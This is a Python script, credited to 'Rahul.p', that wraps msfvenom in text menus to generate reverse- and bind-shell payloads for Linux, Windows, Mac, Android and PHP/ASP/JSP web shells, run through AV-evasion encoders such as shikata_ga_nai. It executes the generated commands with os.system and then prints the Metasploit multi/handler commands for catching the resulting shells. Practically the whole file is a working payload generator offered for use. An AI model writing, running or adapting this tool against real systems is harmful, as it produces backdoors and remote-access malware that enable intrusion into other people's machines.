import sys
import os
import socket
import subprocess
import urllib

def main():
	os.system('clear')
	credits()
	print ("""

**********************************************************************
*                                                                    *
*                          Main menu	                             *
*                                                                    *
**********************************************************************
*                                                                    *
* [1]   linux                                                        *
* [2]   windows                                                      *
* [3]   mac                                                          *
* [4]   web payloads                                                 *
* [5]   scripting                                                    *
* [6]   android                                                      *
* [7]   shellcode (raw)                                              *
*                                                                    *
**********************************************************************
    """)
	opt = ["linux", "windows", "mac", "webpayloads", "scripting", "android", "shellcode"]
	op = int(input("Select the input: "))
	option = str(opt[op-1])
	platform = '--platform '+option
	return option
def linux():
	os.system('clear')
	credits()
	print ("""
**********************************************************************
*                                                                    *
*                             Linux menu                             *
*                                                                    *
**********************************************************************
*                                                                    *
* [1]   Reverse shell                                                *
* [2]   bind shell                                                   *
*                                                                    *
**********************************************************************
    """)
	opt = ["linux/x86/meterpreter/reverse_tcp", "linux/x86/meterpreter/bind_tcp"]
	op = int(input ("Select the input: "))
	payload = str(opt[op-1])
	gpa = payload
	payload = ' -p '+payload
	return payload,gpa
def windows():
	os.system('clear')
	credits()
	print ("""
**********************************************************************
*                                                                    *
*                            windows menu                            *
*                                                                    *
**********************************************************************
*                                                                    *
* [1]   Reverse shell                                                *
* [2]   bind shell                                                   *
* [3]   cmd shell                                                    *
* [4]   user creation                                                *
*                                                                    *
**********************************************************************
    """)
	opt = ["windows/meterpreter/reverse_tcp", "windows/meterpreter/blind_tcp", "windows/shell/reverse_tcp ", "windows/adduser"]
	op = int(input ("Select the input: "))
	payload = str(opt[op-1])
	gpa = payload
	payload = ' -p '+payload
	return payload,gpa
def mac():
	os.system('clear')
	credits()
	print ("""
**********************************************************************
*                                                                    *
*                             Mac menu                               *
*                                                                    *
**********************************************************************
*                                                                    *
* [1]   Reverse shell                                                *
* [2]   bind shell                                                   *
*                                                                    *
**********************************************************************
""")
	opt = ["osx/x86/shell_reverse_tcp", "osx/x86/shell_bind_tcp"]
	op = int(input ("Select the input: "))
	payload = str(opt[op-1])
	gpa = payload
	payload = ' -p '+payload
	return payload,gpa
def webpayloads():
	os.system('clear')
	credits()
	print ("""
**********************************************************************
*                                                                    *
*                         web payloads menu                          *
*                                                                    *
**********************************************************************
*                                                                    *
* [1]   php                                                          *
* [2]   asp                                                          *
* [3]   jsp                                                          *
* [4]   war                                                          *
*                                                                    *
**********************************************************************
""")
	opt = ["php/meterpreter_reverse_tcp", "windows/meterpreter/reverse_tcp", "java/jsp_shell_reverse_tcp", "java/jsp_shell_reverse_tcp"]
	op = int(input ("Select the input: "))
	payload = str(opt[op-1])
	gpa = payload
	if payload == 'php/meterpreter_reverse_tcp':
		payload = ' -p '+payload + ' -f raw > shell.php'
	elif payload == 'windows/meterpreter/reverse_tcp':
		payload = ' -p '+payload + ' -f asp > shell.asp'
	elif payload == 'java/jsp_shell_reverse_tcp':
		payload = ' -p '+payload + ' -f raw > shell.jsp'
	elif payload ==	'java/jsp_shell_reverse_tcp':
		payload = ' -p '+payload + ' -f war > shell.war'
	return payload,gpa
def scripting():
	os.system('clear')
	credits()
	print ("""
**********************************************************************
*                                                                    *
*                             Scripting menu                         *
*                                                                    *
**********************************************************************
*                                                                    *
* [1]   python                                                       *
* [2]   bash                                                         *
* [3]   perl                                                         *
* [4]   nodejs                                                       *
*                                                                    *
**********************************************************************
""")
	opt = ["cmd/unix/reverse_python", "cmd/unix/reverse_bash", "cmd/unix/reverse_perl", "nodejs/shell_reverse_tcp"]
	op = int(input ("Select the input: "))
	payload = str(opt[op-1])
	gpa = payload
	if payload == 'cmd/unix/reverse_python':
		payload = ' -p '+payload + ' -f raw > shell.py'
	elif payload == 'cmd/unix/reverse_bash':
		payload = ' -p '+payload + ' -f raw > shell.sh'
	elif payload == 'cmd/unix/reverse_perl':
		payload = ' -p '+payload + ' -f raw > shell.pl'
	return payload,gpa
def android():
	os.system('clear')
	credits()
	print ("""
**********************************************************************
*                                                                    *
*                             Android menu                           *
*                                                                    *
**********************************************************************
*                                                                    *
* [1]   Reverse shell                                                *
*                                                                    *
*                                                                    *
**********************************************************************
""")
	opt = ["android/meterpreter/reverse_tcp"]
	op = int(input ("Select the input: "))
	payload = str(opt[op-1])
	gpa = payload
	payload = ' -p '+payload + ' R > shell.apk'
	return payload,gpa
def format():
    print("""
+----------------------------------------+
|          Executable formats            |
+-----------+----------------+-----------+
|    asp    |      aspx      |  aspx-exe |
+-----------+----------------+-----------+
|    dll    |       elf      |   elf-so  |
+-----------+----------------+-----------+
|  exe-only |   exe-service  | exe-small |
+-----------+----------------+-----------+
|    jar    |    loop-vbs    |   macho   |
+-----------+----------------+-----------+
| msi-nouac |     osx-app    |    psh    |
+-----------+----------------+-----------+
|  psh-net  | psh-reflection |    vba    |
+-----------+----------------+-----------+
|  vba-psh  |       vbs      |    war    |
+-----------+----------------+-----------+
|   axis2   |       exe      |  hta-psh  |
+-----------+----------------+-----------+
|    msi    |     psh-cmd    |  vba-exe  |
+-----------+----------------+-----------+

+----------------------------------+
|         Transform formats        |  
+---------------+-------+----------+
|      bash     |   c   |  csharp  |
+---------------+-------+----------+
|       dw      | dword |    hex   |
+---------------+-------+----------+
|      java     | js_be |   js_le  |
+---------------+-------+----------+
|      num      |  perl |    pl    |
+---------------+-------+----------+
|   powershell  |  ps1  |    py    |
+---------------+-------+----------+
|     python    |  raw  |    rb    |
+---------------+-------+----------+
|      ruby     |   sh  | vbscript |
+---------------+-------+----------+
|            vbapplication         |
+---------------+-------+----------+
""")
    fo = str(input("enter your desire format (eg: bash) : "))
    return fo
def Shellcode():
	os.system('clear')
	credits()
	print ("""
**********************************************************************
*                                                                    *
*                          shell code	                             *
*                                                                    *
**********************************************************************
*                                                                    *
* [1]   linux                                                        *
* [2]   windows                                                      *
* [3]   mac                                                          *
*                                                                    *
**********************************************************************
""")
	opt = ["linux/x86/meterpreter/reverse_tcp", "windows/meterpreter/reverse_tcp", "osx/x86/shell_reverse_tcp"]
	op = int(input ("Select the input: "))
	payload = str(opt[op-1])
	payload = '-p '+payload
	gpa = payload
	fo = format()
	payload = payload+" -f "+fo
	return payload,gpa
def encoder():
	os.system('clear')
	credits()
	print ("""
+------------------------------+-----------+--------------------------------------------------------+
|       Name                   |   Rank    |      Description                                       |
+------------------------------+-----------+--------------------------------------------------------+
| cmd/brace                    | low       | Bash Brace Expansion Command Encoder                   |
| cmd/echo                     | good      | Echo Command Encoder                                   |
| cmd/generic_sh               | manual    |  Generic Shell Variable Substitution Command Encoder   |
| cmd/ifs                      | low       | Generic (IFS)  Substitution Command Encoder            |
| cmd/perl                     | normal    |  Perl Command Encoder                                  |
| cmd/powershell_base64        | excellent | Powershell Base64 Command Encoder                      |
| cmd/printf_php_mq            | manual    | printf(1) via PHP magic_quotes Utility Command Encoder |
+------------------------------+-----------+--------------------------------------------------------+
| generic/eicar                | manual    | The EICAR Encoder                                      |
| generic/none                 | normal    | The "none" Encoder                                     |
+------------------------------+-----------+--------------------------------------------------------+
| mipsbe/byte_xori             | normal    | Byte XORi Encoder                                      |
| mipsbe/longxor               | normal    | XOR Encoder                                            |
| mipsle/byte_xori             | normal    | Byte XORi Encoder                                      |
| mipsle/longxor               | normal    | XOR Encoder                                            |
+------------------------------+-----------+--------------------------------------------------------+
| php/base64                   | great     | PHP Base64 Encoder                                     |
+------------------------------+-----------+--------------------------------------------------------+
| ppc/longxor                  | normal    | PPC LongXOR Encoder                                    |
| ppc/longxor_tag              | normal    | PPC LongXOR Encoder                                    |
+------------------------------+-----------+--------------------------------------------------------+
| ruby/base64                  | great     | Ruby Base64 Encoder                                    |
+------------------------------+-----------+--------------------------------------------------------+
| sparc/longxor_tag            | normal    | SPARC DWORD XOR Encoder                                |
+------------------------------+-----------+--------------------------------------------------------+
| x64/xor                      | normal    | XOR Encoder                                            |
| x64/xor_dynamic              | normal    | Dynamic key XOR Encoder                                |
| x64/zutto_dekiru             | manual    | Zutto Dekiru                                           |
+------------------------------+-----------+--------------------------------------------------------+
| x86/add_sub                  | manual    | Add/Sub Encoder                                        |
| x86/alpha_mixed              | low       | Alpha2 Alphanumeric Mixedcase Encoder                  |
| x86/alpha_upper              | low       | Alpha2 Alphanumeric Uppercase Encoder                  |
| x86/avoid_underscore_tolower | manual    | Avoid underscore/tolower                               |
| x86/avoid_utf8_tolower       | manual    | Avoid UTF8/tolower                                     |
| x86/bloxor                   | manual    | BloXor - A Metamorphic Block Based XOR Encoder         |
| x86/bmp_polyglot             | manual    | BMP Polyglot                                           |
| x86/call4_dword_xor          | normal    | Call+4 Dword XOR Encoder                               |
| x86/context_cpuid            | manual    | CPUID-based Context Keyed Payload Encoder              |
| x86/context_stat             | manual    | stat(2)-based Context Keyed Payload Encoder            |
| x86/context_time             | manual    | time(2)-based Context Keyed Payload Encoder            |
| x86/countdown                | normal    | Single-byte XOR Countdown Encoder                      |
| x86/fnstenv_mov              | normal    |  Variable-length Fnstenv/mov Dword XOR Encoder         |
| x86/jmp_call_additive        | normal    | Jump/Call XOR Additive Feedback Encoder                |
| x86/nonalpha                 | low       | Non-Alpha Encoder                                      |
| x86/nonupper                 | low       | Non-Upper Encoder                                      |
| x86/opt_sub                  | manual    | Sub Encoder (optimised)                                |
| x86/service                  | manual    | Register Service                                       |
| x86/shikata_ga_nai           | excellent | Polymorphic XOR Additive Feedback Encoder              |
| x86/single_static_bit        | manual    | Single Static Bit                                      |
| x86/unicode_mixed            | manual    | Alpha2 Alphanumeric Unicode Mixedcase Encoder          |
| x86/unicode_upper            | manual    | Alpha2 Alphanumeric Unicode Uppercase Encoder          |
| x86/xor_dynamic              | noraml    | Dynamic key XOR Encoder                                |
+------------------------------+-----------+--------------------------------------------------------+
		""")
	encoder = str(input("enter the name of the encoder (example : generic/none) : "))
	encoder = '-e '+encoder
	iteration = str(input("enter number of iterations (large number increase the size of file) :"))
	return encoder,iteration
def details():
	credits()
	ip = str(input("enter ip adress : "))
	port = str(input("enter port number : "))
	return ip,port
def credits():
	print("""
	MSFVENOM AUTOMATIC CODE GENERATOR
	""")
	print("""

 ██▀███   ▄▄▄       ██░ ██  █    ██  ██▓    
▓██ ▒ ██▒▒████▄    ▓██░ ██▒ ██  ▓██▒▓██▒    
▓██ ░▄█ ▒▒██  ▀█▄  ▒██▀▀██░▓██  ▒██░▒██░    
▒██▀▀█▄  ░██▄▄▄▄██ ░▓█ ░██ ▓▓█  ░██░▒██░    
░██▓ ▒██▒ ▓█   ▓██▒░▓█▒░██▓▒▒█████▓ ░██████▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░
  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░▒░ ░░░▒░ ░ ░ ░ ░ ▒  ░
  ░░   ░   ░   ▒    ░  ░░ ░ ░░░ ░ ░   ░ ░   
   ░           ░  ░ ░  ░  ░   ░         ░  ░ code generated by Rahul.p

""")
	print("# This tool will generate automatic code of MSFvenom by RAPID7 #")
	print("** MAXIMISE YOUR CONSOLE SCREEN FOR BETTER RESULTS**")
def payload_selection():
	print ("seleted " +platform)
	if platform == "linux":
		payload,gpa = linux()
		print ("seleted payload is : "+payload)
		return payload,gpa
	elif platform == "windows":
		payload,gpa = windows()
		print ("seleted payload is : "+payload)
		return payload,gpa
	elif platform == "mac":
		payload,gpa = mac()
		print ("seleted payload is : "+payload)
		return payload,gpa
	elif platform == "webpayloads":
		payload,gpa = webpayloads()
		print ("seleted payload is : "+payload)
		return payload,gpa
	elif platform == "scripting":
		payload,gpa = scripting()
		print ("seleted payload is : "+payload)
		return payload,gpa
	elif platform == "shellcode":
		payload,gpa = Shellcode()
		return payload,gpa
	elif platform == "android":
		payload,gpa = android()
		print ("seleted payload is : "+payload)
		return payload,gpa
	else:
		print("choose correct option")
def run():
	if platform == 'shellcode':
		out = "msfvenom LHOST="+ip+" LPORT="+port+" "+enc+" -i "+ite+ " "+payload
		print(out)
		os.system("%s" %out)
	elif platform == "linux":
		out = "msfvenom "+payload+" LHOST="+ip+" LPORT="+port+" "+enc+" -i "+ite+' -f elf > shell.elf'
		print(out)
		os.system("%s" %out)
	elif platform == "windows":
		out = "msfvenom "+payload+" LHOST="+ip+" LPORT="+port+" "+enc+" -i "+ite+' -f exe > shell.exe'
		print(out)
		os.system("%s" %out)
	elif platform == "mac":
		out = "msfvenom "+payload+" LHOST="+ip+" LPORT="+port+" "+enc+" -i "+ite+' -f macho > shell.macho'
		print(out)
		os.system("%s" %out)
	elif platform == "webpayloads":
		out = "msfvenom "+" LHOST="+ip+" LPORT="+port+" "+enc+" -i "+ite+" "+payload
		print(out)
		os.system("%s" %out)
	elif platform == "scripting":
		out = "msfvenom "+" LHOST="+ip+" LPORT="+port+" "+enc+" -i "+ite+" "+payload
		print(out)
		os.system("%s" %out)
	elif platform == "android":
		out = "msfvenom "+" LHOST="+ip+" LPORT="+port+" "+enc+" -i "+ite+" "+payload
		print(out)
		os.system("%s" %out)
	return platform,ip,port,payload,enc,ite
def de():
	credits()
	print("*************************************")
	print("ip               : "+ip)
	print("port             : "+port)
	print("platform         : "+platform)
	print("payload          : "+gpa)
	print("encoder          : "+enc)
	print("*************************************")
	return ip,port,platform,gpa,enc
def en():
	credits()
	print("*************************************")
	print("copy the following code and paste in metasploit for listening")
	print("*************************************")
	print("use exploit/multi/handler")
	print("set PAYLOAD "+gpa)
	print("set LHOST "+ip)
	print("set LPORT "+port)
	print("set ExitOnSession false")
	print("exploit -j")
	return gpa,ip,port
ip,port = details()
platform = main()
payload,gpa = payload_selection()
enc,ite = encoder()
ip,port,platform,gpa,enc = de()
platform,ip,port,payload,enc,ite=run()
gpa,ip,port = en()
